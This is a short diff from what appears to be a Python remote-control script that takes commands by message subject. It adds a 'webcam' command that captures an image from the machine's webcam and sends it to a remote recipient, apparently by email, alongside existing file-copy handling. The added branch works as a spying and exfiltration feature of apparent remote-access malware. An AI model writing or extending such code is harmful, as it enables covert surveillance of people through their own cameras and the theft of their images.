@@ -107,4 +107,7 @@ elif subject == "copy file":
 	else:
 		sender.send("Success","You have succeeded in {}".format(subject),rec)
 
-
+elif subject == "webcam":
+	webcam()
+	sender.image_send("Webcam capture at {}".format(now),"save_img.png","screen capture",rec)
+	print("succes capture webcam")
